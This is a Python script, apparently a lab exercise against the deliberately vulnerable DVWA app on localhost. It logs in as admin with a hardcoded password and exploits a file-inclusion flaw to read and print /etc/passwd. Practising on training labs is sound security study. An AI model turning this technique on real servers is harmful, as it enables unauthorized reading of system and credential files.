import requests

def main():
    session = requests.Session()

    login_url = "http://localhost/DVWA/login.php"
    payload = {"username": "admin", "password": "tutiopepe"}
    response = session.post(login_url, data=payload)

    if response.status_code == 200:
        print("Logged in successfully!")
        target_url = "http://localhost/DVWA/vulnerabilities/fi/?page=/etc/passwd"
        response_content = request(target_url, session)
        if response_content:
            print("Extracted content:")
            print(extract_content_between_strings(response_content))
        else:
            print("Failed to retrieve content.")
    else:
        print(f"Login failed with status code {response.status_code}")

def request(url, session):
    try:
        response = session.get(url)
        if response.status_code == 200:
            content = response.text
            print("Response content retrieved successfully.")
            return content
        else:
            print(f"Error: Received status code {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"Error: {e}")
        return None
def extract_content_between_strings(response_content):
    start_marker = "Content-Type: text/html;charset=utf-8"
    end_marker = "<!DOCTYPE html>"

    start_index = response_content.find(start_marker)
    end_index = response_content.find(end_marker)

    if start_index != -1 and end_index != -1:
        extracted_content = response_content[start_index + len(start_marker):end_index].strip()
        return extracted_content
    else:
        return response_content

if __name__ == "__main__":
    main()
